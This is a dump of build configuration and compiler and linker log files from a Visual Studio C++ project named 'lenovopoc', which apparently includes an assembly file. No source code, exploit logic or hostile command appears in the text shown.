    <ClCompile Include="lenovopoc.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Header.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="PrepareStack.asm" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>
```

`lenovopoc/lenovopoc.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="lenovopoc.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Header.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="PrepareStack.asm">
      <Filter>Source Files</Filter>
    </MASM>
  </ItemGroup>
</Project>
```

`lenovopoc/lenovopoc.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`lenovopoc/x64/Debug/lenovopoc.Build.CppClean.log`:

```log
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\vc143.pdb
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\vc143.idb
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.obj
c:\users\user\source\repos\lenovopoc\x64\debug\lenovopoc.exe
c:\users\user\source\repos\lenovopoc\x64\debug\lenovopoc.pdb
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\preparestack.obj
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.ilk
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\cl.command.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\cl.items.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\cl.read.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\cl.write.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\link.command.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\link.read.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\link.secondary.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\link.write.1.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\masm.read.1u.tlog
c:\users\user\source\repos\lenovopoc\lenovopoc\x64\debug\lenovopoc.tlog\masm.write.1u.tlog

```

`lenovopoc/x64/Debug/lenovopoc.exe.recipe`:

```recipe
<?xml version="1.0" encoding="utf-8"?>
<Project>
  <ProjectOutputs>
    <ProjectOutput>
      <FullPath>C:\Users\user\source\repos\lenovopoc\x64\Debug\lenovopoc.exe</FullPath>
    </ProjectOutput>
  </ProjectOutputs>
  <ContentFiles />
  <SatelliteDlls />
  <NonRecipeFileRefs />
</Project>
```

`lenovopoc/x64/Debug/lenovopoc.log`:

```log
  Assembling PrepareStack.asm...
  lenovopoc.cpp
  lenovopoc.vcxproj -> C:\Users\user\source\repos\lenovopoc\x64\Debug\lenovopoc.exe

```

`lenovopoc/x64/Debug/lenovopoc.tlog/CL.command.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\LENOVOPOC.CPP
/c /ZI /JMC /nologo /W3 /WX- /diagnostics:column /sdl /Od /D _DEBUG /D _CONSOLE /D _UNICODE /D UNICODE /Gm- /EHsc /RTC1 /MDd /GS /fp:precise /Zc:wchar_t /Zc:forScope /Zc:inline /permissive- /Fo"X64\DEBUG\\" /Fd"X64\DEBUG\VC143.PDB" /external:W3 /Gd /TP /FC C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\LENOVOPOC.CPP

```

`lenovopoc/x64/Debug/lenovopoc.tlog/CL.read.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\LENOVOPOC.CPP
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\BIN\HOSTX64\X64\1033\CLUI.DLL
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINDOWS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\EXCPT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\VCRUNTIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\SAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\CONCURRENCYSAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\VADEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\STDARG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\MINWINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMCPY_S.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\ERRNO.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\VCRUNTIME_STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK8.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISETCCONV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MINWINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\APIQUERY2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSENV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPIFROMAPP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DEBUGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UTILAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HANDLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ERRHANDLINGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FIBERSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMEDPIPEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROFILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HEAPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IOAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYNCHAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\INTERLOCKEDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTHREADSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSINFOAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MEMORYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ENCLAVEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLLEGACYAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WOW64APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LIBLOADERAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMESPACEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSTEMTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYAPPCONTAINER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REALTIMEAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINERROR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEZONEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINGDI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINUSER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\TVOUT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNLS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DATETIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\STRINGAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCONTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI3.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\VERRSRC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINREG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REASON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNETWK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WNNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\CDERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDEML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DLGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LZEXPAND.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSTEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSCOM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCIAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PLAYSOUNDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOYSTICKAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NB30.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCEP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNTERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCASYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SHELLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINPERF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSOCK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\INADDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSCARD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSIP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPESBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINIOCTL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINSMCRD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PRSHT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLE2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDLIB.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MALLOC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SEARCH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDLIB.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\LIMITS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWNBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CGUID.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COML2API.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OAIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\URLMON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SERVPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MSXML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEAUTO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMMDLG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\STRALIGN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSVC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCX.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IMM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IME_CMODES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_STDIO_CONFIG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\PROFESSIONAL\VC\TOOLS\MSVC\14.44.35207\INCLUDE\STDINT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\ASSERT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\INTTYPES.H

```

`lenovopoc/x64/Debug/lenovopoc.tlog/CL.write.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\LENOVOPOC.CPP
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\VC143.PDB
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\VC143.IDB
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\LENOVOPOC.OBJ

```

`lenovopoc/x64/Debug/lenovopoc.tlog/Cl.items.tlog`:

```tlog
C:\Users\user\source\repos\lenovopoc\lenovopoc\lenovopoc.cpp;C:\Users\user\source\repos\lenovopoc\lenovopoc\x64\Debug\lenovopoc.obj

```

`lenovopoc/x64/Debug/lenovopoc.tlog/Masm.read.1u.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\PREPARESTACK.ASM

```

`lenovopoc/x64/Debug/lenovopoc.tlog/Masm.write.1u.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\PREPARESTACK.ASM
C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\PREPARESTACK.OBJ

```

`lenovopoc/x64/Debug/lenovopoc.tlog/lenovopoc.lastbuildstate`:

```lastbuildstate
PlatformToolSet=v143:VCToolArchitecture=Native64Bit:VCToolsVersion=14.44.35207:TargetPlatformVersion=10.0.26100.0:
Debug|x64|C:\Users\user\source\repos\lenovopoc\|

```

`lenovopoc/x64/Debug/lenovopoc.tlog/link.command.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\LENOVOPOC.OBJ|C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\PREPARESTACK.OBJ
/OUT:"C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\X64\DEBUG\LENOVOPOC.EXE" /INCREMENTAL /ILK:"X64\DEBUG\LENOVOPOC.ILK" /NOLOGO KERNEL32.LIB USER32.LIB GDI32.LIB WINSPOOL.LIB COMDLG32.LIB ADVAPI32.LIB SHELL32.LIB OLE32.LIB OLEAUT32.LIB UUID.LIB ODBC32.LIB ODBCCP32.LIB /MANIFEST /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /manifest:embed /DEBUG /PDB:"C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\X64\DEBUG\LENOVOPOC.PDB" /SUBSYSTEM:CONSOLE /TLBID:1 /DYNAMICBASE /NXCOMPAT /IMPLIB:"C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\X64\DEBUG\LENOVOPOC.LIB" /MACHINE:X64 X64\DEBUG\LENOVOPOC.OBJ
X64\DEBUG\PREPARESTACK.OBJ

```

`lenovopoc/x64/Debug/lenovopoc.tlog/link.read.1.tlog`:

```tlog
^C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\LENOVOPOC.OBJ|C:\USERS\USER\SOURCE\REPOS\LENOVOPOC\LENOVOPOC\X64\DEBUG\PREPARESTACK.OBJ
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\KERNEL32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\USER32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\GDI32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\WINSPOOL.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\COMDLG32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\ADVAPI32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\SHELL32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\OLE32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\OLEAUT32.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.26100.0\UM\X64\UUID.LIB
